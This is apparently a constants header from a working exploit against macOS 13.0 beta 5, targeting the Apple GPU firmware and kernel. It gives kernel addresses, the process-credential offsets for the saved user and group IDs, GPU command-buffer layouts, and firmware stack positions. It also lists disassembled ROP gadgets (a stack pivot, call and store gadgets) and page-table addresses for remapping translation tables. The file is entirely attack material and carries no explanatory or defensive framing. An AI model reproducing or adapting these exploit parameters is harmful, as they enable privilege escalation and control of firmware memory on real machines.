// Constants for 13.0 beta 5 (22A5321d)

#ifndef __METAL_VERSION__
# define constant static const
#endif

// Hardware contants
constant u64 p_ram_base         = 0x800000000;
constant u64 p_ram_top_max      = 0xc00000000;

// Platform firmware constants
constant u32 homm_id_fb         = 0x0e;
constant u32 homm_id_ram        = 0x18;
constant u64 mem_bot_ctrr       = 0x1477000;
constant u64 mem_bot_resv       = 0x1f78000;
constant u64 mem_top_resv       = 0x20fbc000;

// Kernel constants
//   Kernel addresses (unslid)
constant u64 kpac_mask          = 0xffff800000000000;
constant u64 ku_kern_base       = 0xfffffe0007004000;
constant u64 ku_allproc         = 0xfffffe000b628e78;

//   Structure offsets
constant u64 off_proc_ro        = 0x18;
constant u64 off_proc_pid       = 0x60;
constant u64 off_proc_ro_ucred  = 0x10 + 0x10;
constant u64 off_ucred_svuid    = 0x18 + 0x08;
constant u64 off_ucred_svgid    = 0x18 + 0x54;

// Kernel driver constants
//   Constant structure offsets
constant u64 v_cmdbufs_start    = 0xffffffa00c188000;
constant u64 v_cmdbufs_end      = 0xffffffa00c1bc000;
constant u64 v_bufmgrs          = 0xffffffa0000d0000;
constant u64 v_cp_stats         = 0xffffffa00c38f980;

//   Command buffer offsets
constant u64 off_context        = 0x10;
constant u64 off_mseq_addr      = 0x1f0;
constant u64 off_mseq_size      = 0x1f8;
constant u64 off_cp_info2       = 0x1fc;
constant u64 off_encoder_id     = 0x268;
constant u64 off_stamp_addr     = 0x290;
constant u64 off_stamp_value    = 0x298;
constant u64 off_stamp_index    = 0x29c;
constant u64 off_flag           = 0x305;
constant u64 cmdbuf_size        = 0x340;

// Firmware constants

//   Global variables
constant u64 v_gptbat_base      = 0xffffff800004d06b;
constant u64 v_kpt_pfn          = 0xffffff80000680b0;
constant u64 v_cur_cmd_state    = 0xffffff80000744b0;
constant u64 v_stamp_states     = 0xffffff8000074e18;

//   Stack position at exploit
constant u64 sp                 = 0xffffff80000baab0 + 0x1c0;
constant u64 v_lr               = sp + 0x58;
constant u64 v_x26              = sp + 0x10;
constant u64 v_x23              = sp + 0x28;
constant u64 v_x22              = sp + 0x30;
constant u64 v_x21              = sp + 0x38;

//   ROP gadgets / functions
constant u64 g_epilogue         = 0xffffff8000021ec0;
//      Epilogue of process_mseq_commands

constant u64 g_stack_pivot      = 0xffffff8000006640;
//      : mov sp, x2 ; movz x0, #0x1 ; ret

constant u64 g_calltwo          = 0xffffff8000045e24;
//      : ldr x8, [x22] ; ldr x8, [x8]
//      : mov x0, x22 ; movz w1, #0x5 ; mov x2, x23 ; mov x3, #0x0
//      : blr x8 (continues)
constant u64 g_callone          = 0xffffff8000045e3c;
//      : ldr x8, [x21, #0x70] ; cbz x8, #xxx
//      : mov x0, x26
//      : blr x8
//      : mov x0, x23
//      : ldp x29, x30, [sp, #0x80]
//      : ldp x20, x19, [sp, #0x70]
//      : ldp x22, x21, [sp, #0x60]
//      : ldp x24, x23, [sp, #0x50]
//      : ldp x26, x25, [sp, #0x40]
//      : ldp x28, x27, [sp, #0x30]
//      : ldp d9, d8, [sp, #0x20]
//      : add sp, sp, #0x90
//      : ret

constant u64 g_store            = 0xffffff800003b310;
//      : str x0, [x23, #0xa78]
//      : ldp x29, x30, [sp, #0x40]
//      : ldp x20, x19, [sp, #0x30]
//      : ldp x22, x21, [sp, #0x20]
//      : ldp x24, x23, [sp, #0x10]
//      : ldp x26, x25, [sp], #0x50
//      : ret

constant u64 g_uppl_call        = 0xffffff8000006650;
//      mmu_gxf_enter(void *op) function

//   Page tables
//     Firmware PT #0 base vaddr
constant u64 v_kpt0             = 0xffffff8001fc8000;
//     Free space used for temporary PT
constant u64 v_tmp_pt           = 0xffffff80000b4000;

// Exploit constants
//   Free vaddr to re-map the ttbat array
constant u64 v_ttbat            = 0xffffff8001000000;
//   Address of context 63 TTB0 inside
constant u64 v_ttb0_63          = v_ttbat + 63 * 16;

//   Scratch space
constant u64 v_scratch          = v_bufmgrs + 0x2000;

//   Virtual base for physical memory map (firmware only stage 1)
constant u64 v_phys_base        = 0xffffffc000000000;
//   Virtual base for physical memory map (GPU-accessible, stage 2)
constant u64 vg_phys_base       = 0xffffffe000000000;

//   New mappings in temporary page table
constant u64 vg_tmp_pt          = v_phys_base + 0x10000;
constant u64 vg_kpt0            = v_phys_base + 0x14000;
constant u64 vg_page0           = v_phys_base + 0x18000;
constant u64 vg_l2_pt           = v_phys_base + 0x1c000;
constant u64 vg_l3_pt           = v_phys_base + 0x20000;

//   Global slots
constant u64 g_p_kpt0           = v_scratch + 0x00;
constant u64 g_p_tmp_pt         = v_scratch + 0x08;
constant u64 g_p_ram_start      = v_scratch + 0x10;
constant u64 g_ram_size         = v_scratch + 0x18;

//   Magic memory write test value
constant u64 magic              = 0x4c696e6143757465;

